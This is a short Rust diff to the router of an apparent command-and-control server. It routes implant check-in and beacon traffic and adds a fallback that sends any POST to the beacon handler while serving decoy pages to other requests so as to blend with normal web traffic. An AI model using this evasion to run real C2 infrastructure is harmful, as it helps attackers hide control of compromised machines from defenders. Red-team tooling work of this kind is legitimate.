@@ -53,12 +53,7 @@ pub fn build_router(state: HttpState) -> Router {
         .route("/api/checkin", post(checkin_handler))
         .route("/api/beacon", post(beacon_handler))
         .route("/api/health", get(health_handler))
-        .route("/api/ws", get(ws_handler::ws_upgrade_handler))
-        // Common profile URI patterns — route to beacon_handler so implants
-        // using profile-driven URIs (e.g., /api/v1/status) reach the handler.
-        .route("/api/v1/{path}", post(beacon_handler))
-        .route("/api/v2/{path}", post(beacon_handler))
-        .route("/api/v3/{path}", post(beacon_handler));
+        .route("/api/ws", get(ws_handler::ws_upgrade_handler));
 
     // If a profile is configured, add profile-driven routes
     if let Some(ref profile) = state.listener_profile {
@@ -67,10 +62,26 @@ pub fn build_router(state: HttpState) -> Router {
         }
     }
 
-    // Fallback decoy for non-matching traffic
-    router = router.fallback(decoy_handler);
+    // Fallback: route POST requests to beacon_handler (supports any profile URI),
+    // return decoy for GET/other methods (blends with normal web traffic).
+    router = router.fallback(fallback_handler);
 
     router.with_state(state)
+}
+
+/// Fallback handler: POST requests are routed to beacon_handler (supports any
+/// profile URI pattern). GET and other methods receive a decoy response to
+/// blend with normal web traffic.
+async fn fallback_handler(
+    method: axum::http::Method,
+    state: State<HttpState>,
+    body: axum::body::Bytes,
+) -> axum::response::Response {
+    if method == axum::http::Method::POST {
+        beacon_handler(state, body).await.into_response()
+    } else {
+        decoy_handler().await.into_response()
+    }
 }
 
 /// Decoy handler for traffic that doesn't match any profile or known endpoint.
